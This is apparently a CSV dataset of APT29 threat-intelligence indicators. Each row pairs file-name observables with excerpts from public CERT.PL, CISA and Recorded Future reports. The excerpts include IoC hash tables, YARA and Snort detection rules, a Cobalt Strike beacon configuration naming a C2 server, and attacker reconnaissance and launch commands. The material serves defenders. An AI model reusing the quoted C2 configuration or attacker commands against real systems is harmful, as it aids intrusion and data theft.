1.0.0,actor--apt29,artifact--sha256:028e72bb268351c4b4e2a92bb92ec050f9eab21f23f756dd77c9b46726e67f81,observation--sha256:ebf04c86c3ed9cd3ab8c23e8f885fec7da60971a04f22caa7066f717073c6450,file-name,exe.pdf,exe.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
1.0.0,actor--apt29,artifact--sha256:f0107cea5e9e66c923a47834a02de3f2a676c86eda1c028295809163e2e3c14d,observation--sha256:feaeb1c0b04fdd4a7fbf01a721f325b43aba190b3b4f227e9fba0fd7baa880f9,file-name,form.php,form.php,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA ThreatAnalysis InfrastructureAnalysis QuarterRigActivity:MarchtoMay2023ThroughanalyzingknownBlueBravoC2infrastructureandrelatedfileartifacts, weidentifiedmultipleadditional compromiseddomainsthat weassessarealmost certainlybeingusedbythethreat grouptodeliver QuarterRig. Oneof thedomainsweobserved, sylvio[.]com[.]br, wasalsopubliclyidentifiedbyCERT PLintheir analysisof theQuarterRigmalwarefamily. Domain RelatedSample Filename te-as[.]no 22b037f0a42579b45530bed196dd2b47",
1.0.0,actor--apt29,artifact--sha256:f0107cea5e9e66c923a47834a02de3f2a676c86eda1c028295809163e2e3c14d,observation--sha256:aab0588e2ed1aee03b69f5cf6d9ec7a02efb9aa25c2b454df7b00c11f44d1a08,file-name,form.php,form.php,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure2: Comparisonof luredocumentsusedtodeliver QuarterRig Left: sylvio.com[.]br/form.php, Right: te-as[.]no)  Source:RecordedFutureandCERT PL) Whenestablishingtheinitial communicationwiththeC2server, theQuarterRigsamplesconstruct aJSONobject containingthefollowingfields: arandomlygenerated""session_id"" for identification, a""method"" fieldwithavalueof “reg” (indicatingaregistrationrequest), a""params"" fieldcontainingthevictim'susernameanddomain, andarandomlygenerated""sa",
1.0.0,actor--apt29,artifact--sha256:f0107cea5e9e66c923a47834a02de3f2a676c86eda1c028295809163e2e3c14d,observation--sha256:72fd407bf98f297291bced2bbfc2215e067599ac2d53329bc71cecef60f62461,file-name,form.php,form.php,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/11 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db90067b84464e75548,
1.0.0,actor--apt29,artifact--sha256:f0107cea5e9e66c923a47834a02de3f2a676c86eda1c028295809163e2e3c14d,observation--sha256:23a4c1eb8fd650c7b6bb08081e35a54ff16fa95c4a70799a8d3ba3fd2ca6e0ba,file-name,form.php,form.php,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 33/36 Network IoCs Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db9006,
1.0.0,actor--apt29,artifact--sha256:2e50211b2754f3691ca1ed527abdd2d5dc511a6a26c4d5fe805ec6fc8760e181,observation--sha256:f93eda2a6e900da06f770e9e4d62ccfb4fbf6c769200fd09913c1242e9f6ec38,file-name,hXaIk1314.pdf,hXaIk1314.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 5/11 Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979b128cbeddf4e70",
1.0.0,actor--apt29,artifact--sha256:2e50211b2754f3691ca1ed527abdd2d5dc511a6a26c4d5fe805ec6fc8760e181,observation--sha256:f598fbf3780a5e678cb51c10d861eb499bbc3fab4dc1ffe502a3456752ba36d2,file-name,hXaIk1314.pdf,hXaIk1314.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 21/24 Network IoCs Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979",
1.0.0,actor--apt29,artifact--sha256:b7f12abe586143c39db0fee9bc22d8b548b8e8cd8e43f9eda829f1eb909cf382,observation--sha256:7a19a9e08ec0315c2ea73dd62fd8517cf5ac71a6f1a1b63053d8a2bb3a105cd1,file-name,hXaIk1725.pdf,hXaIk1725.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 5/11 Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979b128cbeddf4e70",
1.0.0,actor--apt29,artifact--sha256:b7f12abe586143c39db0fee9bc22d8b548b8e8cd8e43f9eda829f1eb909cf382,observation--sha256:b9a7df4e2e9854bc622599cfc3a5e19eb82ddc1885d407edcfeec7241f5fa27a,file-name,hXaIk1725.pdf,hXaIk1725.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 21/24 Network IoCs Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979",
1.0.0,actor--apt29,artifact--sha256:7cbf0e4021364d02eef5a1d7f15d97fe5930d1c21ccbc41962236d275ecffc58,observation--sha256:0117c4da1c8109cd93c55a1ec085cf7129179454330e0b502f7f0bd3d490a3c6,file-name,hXaIk2508.pdf,hXaIk2508.pdf,candidate,2023-02-07T00:00:00Z,day,known,same-record,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 15/24 ""text"":{ ""content"":""<VictimID>"" }, ""type"":""text"" } ] } } } Where <EncFingerprint> is the previously mentioned encrypted fingerprint made from computername and username. Victim-specific API requests are sent to api.notion.com/v1/pages URL. 3. After that, SNOWYAMBER starts regular beaconing which is sent every 60 seconds and uses an HTTP PATCH request. Each updates the “emoji” field in the victim-specific page by incrementing it. { ""i",
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:b0b3e6b9be926bc43432c104bd4423a9c2182c1d861648277f8afe5c6e615673,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 11/36 Reconstructed export hashing can be illustrated using the following script: def hash(x): s = 0 for x in x.encode(): s = ror(s, 13) + x return s Hashed export name found in the shellcode corresponds to “runnder_dll”. >>> hash(""runner_dll\x00"") 3137192214 3rd Stage – Intermediate Shellcode Loader – runner.dll Runner.dll is an intermediate step loader – it is similar in implementation and in functionality to hijacker.dll. Runnder.dll i",
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:0c87b12e0167b896b5197ff9d81608b686e22e1147aa743c2886517aa3f22bc3,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 2/36 Table of Contents Table of Contents ................................ ................................ ................................ ................................ ................................ .......... 2 Threat Summary ................................ ................................ ................................ ................................ ................................ ............ 3 Detailed Technical Analysis ,
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:fd6ad82d6815298cac9e436113110c861320837274203a72d99c2a986e9e3491,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 30/36 YARA Rule A rule that can be used to scan for QUARTERRIG: rule apt29_QUARTERRIG { strings: $str_dll_name = ""hijacker.dll"" $str_import_name = ""VCRUNTIME140.dll"" // 48 8B 15 39 6A 00 00 mov rdx, cs:api_stuff.OpenThread // 48 8D 0D FA 68 00 00 lea rcx, api_stuff // 8B D8 mov ebx, eax // E8 3F 25 00 00 call load_api_addr // 44 8B C3 mov r8d, ebx // 33 D2 xor edx, edx // B9 FF FF 1F 00 mov ecx, 1FFFFFh // FF D0 call rax $op_resolve_and_c",
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:7b526f3558acb60eba126bba16d05a9ee31c53b1778f472314efe28f9bdf60b4,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 7/36 Figure 4 - QUARTERRIG delivery and execution chain 1st Stage - Initial DLL – hijacker.dll The first stage of QUARTERRIG’s execution is a simple loader that shows multiple similarities to the first stage of HALFRIG including multiple direct code overlaps. Based on data found in DLL, its original name was hijacker.dll. The DLL starts off by decrypting a number of WinAPI function names. Encrypted strings are retrieved from the .data sec",
1.0.0,actor--apt29,artifact--sha256:3e23f3c3ff3a63a21420e7b799f1842311a9f76149d9878613a4430566a301ab,observation--sha256:0737bac77eef1be336c3c1522e157b765975570d0d8b4f044c1501022ae458c5,file-name,hijacker.dll,hijacker.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 9/36 The following IDAPython script can be used to recreate the structure used to store module information and API names: name = ""api_load"" struct_id = idc.add_struc(0, name, 0) apis = [""module_base"",""kernel32.dll"",""VirtualAlloc"",""RtlCopyMemory"",""VirtualProtec t"",""VirtualFree"",""GetCurrentProcess"",""GetModuleHandleA"",""K32GetModuleInfo"",""Create FileA"",""CreateFileMapping"",""MapViewOfFile"",""CloseHandle"",""FreeLibrary"",""GetSystemD irectory"",""GetL",
1.0.0,actor--apt29,artifact--sha256:a553370dc3754310874380e5ca2b7221a143084a2c4b39e9a08190f0111e8041,observation--sha256:64c57a7211a01475261fc3e0005c55b07bb404c63ce1c30d9f3831a4a22576ad,file-name,httpd.conf,httpd.conf,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:6fd9b04e2567a4289c44478dd765e52cb2cc25ed988c2e308dec8cff83870040,observation--sha256:148b5b6d704e2d88f7727003400a81f22328ac66887db7eab2ceacd6ae02d37e,file-name,httpd.exe,httpd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:6d3e14e521a7af338a33b723d31ca76275ccad7331513256ae42672cf102c307,observation--sha256:c245faf0e7d92aaa4b4df60971a6b2266b9aa875300ab7a9de0ff5e3c114b78d,file-name,i.php,i.php,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 21/24 Network IoCs Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979",
1.0.0,actor--apt29,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:7564885042c98fd225e5d420760e110ee00d8a81e1d362d72191dc546da4e77c,file-name,index.php,index.php,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/11 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db90067b84464e75548,
1.0.0,actor--apt29,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:debc7e069ec582d9efbf670801e9dba473047e8821572a93f1f46a5919294622,file-name,index.php,index.php,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 33/36 Network IoCs Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db9006,
1.0.0,actor--apt29,artifact--sha256:979cee49a75d5dcf184edb25239662357aee3f45327666ecab294093dc2d997e,observation--sha256:d8da2dd4d995a73caa268952d411fd15a47a5bd7db32c13647ed660d1c9f55c3,file-name,isusedtoloadAppIsvSubsystems64.dll,isusedtoloadAppIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Whenavictimtriestoopenanyof theLNKfiles, it triggerstheexecutionof thecommandcmd /cstart .$Recycle.Bin\windoc.exe && "".$Recycle.Bin\bmw[X].png"". Thiscommandisusedtolaunchwindoc.exeandopenaPNGfilecorrespondingtothenumber of theLNKfileopened.Windoc.exeservesastheinitial executionpoint for themalware, whilethePNGfileactsasadecoytodivert attentionawayfromthemalwareasit beginsitsexecutionwithintheWindoc.exeprocess. Windoc.exeisabenigncopyof theMicrosoft Wordapplicationthat",
1.0.0,actor--apt29,artifact--sha256:9d6fc063c1117d184542994cb57995f3c937dea7222f71b11efcebeea6927d46,observation--sha256:f453bc40ef0b89a437517668504df12ff1efdb989b50cddec9821b5ab6dc7360,file-name,jquery-3.3.1.min.js,jquery-3.3.1.min.js,candidate,,unknown,unknown,not-stated,2021-01-01T00:00:00Z,source--apt29--69e8994e0338b7b2,SunBurst/Nobelium2021.pdf,"{""page"": 6}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,Campagnes d’hameçonnage du mode opératoire d’attaquants Nobelium 3. Infrastructure de contrôle et de commande La charge ﬁnale déposée par le mode opératoire est un implant Cobalt Strike. Il est conﬁguré pour contacter ses serveurs de commande et de contrôle (C2) en HTTPs sur le port 443. Les noms de domaine et adresses IP correspondant à l’infrastructure C2 sont disponibles en annexe A . 3.1. Serveurs du mode opératoire L’infrastructure C2 du mode opératoire est constituée de virtual private ser,
1.0.0,actor--apt29,artifact--sha256:1afd8abc0d903170081c4b2b6c60af1d13c6a98c945abe9fac46108d0a222d57,observation--sha256:028237f9eb616e0e6daf7dbf720d629ee790e2beb796339c7f5bfd02d9eecd94,file-name,jquery-3.3.2.min.js,jquery-3.3.2.min.js,candidate,,unknown,unknown,not-stated,2021-01-01T00:00:00Z,source--apt29--69e8994e0338b7b2,SunBurst/Nobelium2021.pdf,"{""page"": 6}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,Campagnes d’hameçonnage du mode opératoire d’attaquants Nobelium 3. Infrastructure de contrôle et de commande La charge ﬁnale déposée par le mode opératoire est un implant Cobalt Strike. Il est conﬁguré pour contacter ses serveurs de commande et de contrôle (C2) en HTTPs sur le port 443. Les noms de domaine et adresses IP correspondant à l’infrastructure C2 sont disponibles en annexe A . 3.1. Serveurs du mode opératoire L’infrastructure C2 du mode opératoire est constituée de virtual private ser,
1.0.0,actor--apt29,artifact--sha256:c84aa15eea19d2c7aa60ae6dcba063f1bb1eac0ea276283a39be829ab26d01ff,observation--sha256:31dc7eaa24bded60019b3d2e858ee03b22f9d418c04b348fc52ffbbd8c23644f,file-name,jquery.min.js,jquery.min.js,candidate,,unknown,unknown,not-stated,,source--apt29--d219ac10702e638c,APT29/Advisory Further TTPs associated with SVR cyber actors.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - signin.php Send""; content:""/signin.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/signin\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - api.php Send""; content:""/api.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/api\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - samples.php Send""; content:""/samples.php?_=""; pcre:""",
1.0.0,actor--apt29,artifact--sha256:d194e61f83844fc6b6e68bfea7e6e9e2044dca4f7758e6ba5e83e7e37708c9bf,observation--sha256:2769317e5ede00676383eccb07442f4ecdaf4c958774cf9e169b071448edb628,file-name,kernel32.dll,kernel32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 14/20 Cobalt Strike Configuration The listing below presents CobaltStrike beacon configuration: 1. { 2. ""BeaconType"": [ 3. ""HTTPS"" 4. ], 5. ""Port"": 443, 6. ""SleepTime"": 60000, 7. ""MaxGetSize"": 1398102, 8. ""Jitter"": 18, 9. ""C2Server"": ""communitypowersports.com,/owa/L7k2NQpwPNLq4C2dHD6TRv00GCH1axhaWv"", 10. ""HttpPostUri"": ""/owa/o9besAWTTVJKNeyrfOOy2tn-epXE7f"", 11. ""Malleable_C2_Instructions"": [ 12. ""Base64 URL-safe decode"" 13. ], 14. ""HttpGe",
1.0.0,actor--apt29,artifact--sha256:d194e61f83844fc6b6e68bfea7e6e9e2044dca4f7758e6ba5e83e7e37708c9bf,observation--sha256:53825cec05243facb45f8a616497bb5bb1837af57b79720bdc246080d6ad341d,file-name,kernel32.dll,kernel32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 18/36 The hash values used in WinAPI lookups are located at the beginning of the binary: Figure 8 - Hex view of the shellcode with API hashes marked in color The following excerpt shows an example of a hashing function being used to identify API names: magic_const = 0x6C8DA39E75EA6287 VirtualAlloc_h = hash_data(b""VirtualAlloc"", magic_const) kernel32_dll_h = hash_data(b""kernel32.dll"".lower(), magic_const) print(UInt64(VirtualAlloc_h ^ kern",
1.0.0,actor--apt29,artifact--sha256:d194e61f83844fc6b6e68bfea7e6e9e2044dca4f7758e6ba5e83e7e37708c9bf,observation--sha256:b755dcc3434661680d62f26d60d4aa5df9b53db3e6be7ca87a09a5841952c72f,file-name,kernel32.dll,kernel32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 25/36 SSH_Banner - HttpGet_Verb - GET HttpPost_Verb - POST HttpPostChunk - 0 Spawnto_x86 - %windir%\syswow64\powercfg.exe Spawnto_x64 - %windir%\sysnative\powercfg.exe CryptoScheme - 0 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRW,
1.0.0,actor--apt29,artifact--sha256:d194e61f83844fc6b6e68bfea7e6e9e2044dca4f7758e6ba5e83e7e37708c9bf,observation--sha256:1a7b6419285d080d5b0b71b116479d56735283b5feb01919539655557a796924,file-name,kernel32.dll,kernel32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 27/36 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRWX - False bProcInject_MinAllocSize - 6785 ProcInject_PrependAppend_x86 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90' Empty ProcInject_PrependAppend_x64 - b'\x90\x90\x90\x90\x90\x90\x9,
1.0.0,actor--apt29,artifact--sha256:d194e61f83844fc6b6e68bfea7e6e9e2044dca4f7758e6ba5e83e7e37708c9bf,observation--sha256:e746135e466425024607cb23fee08da3e3e6e02f6be0df4c93ded333d0c2310f,file-name,kernel32.dll,kernel32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 29/36 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRWX - False bProcInject_MinAllocSize - 6785 ProcInject_PrependAppend_x86 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90' Empty ProcInject_PrependAppend_x64 - b'\x90\x90\x90\x90\x90\x90\x9,
1.0.0,actor--apt29,artifact--sha256:d194e61f83844fc6b6e68bfea7e6e9e2044dca4f7758e6ba5e83e7e37708c9bf,observation--sha256:1fa042aa66dfb8ef485be3a30e1a4dd04a957fda97440ad21600c159ed283c73,file-name,kernel32.dll,kernel32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 8/36 If ( dword_180008A88 > *(v2 + 4) ) { Init_thread_header(&dword_180008A88); if ( dword_180008A88 == 0xFFFFFFFF ) { si128.m128i_i64[0] = 0xEBB5E012028D69F9ui64; si128.m128i_i32[2] = 0xAA54F31B; szKernel32 = 0xEBB5E012028D69F9ui64; // kernel32 word_1800086BC = 0x16F; // \x00\xff dword_1800086B8 = 0xAA54F31B; // .dll Init_thread_footer(&dword_180008A88); } } if ( HIBYTE(word_1800086BC) ) { rc4_string_crypt(&szKernel32, 13i64); HIBYTE(wor",
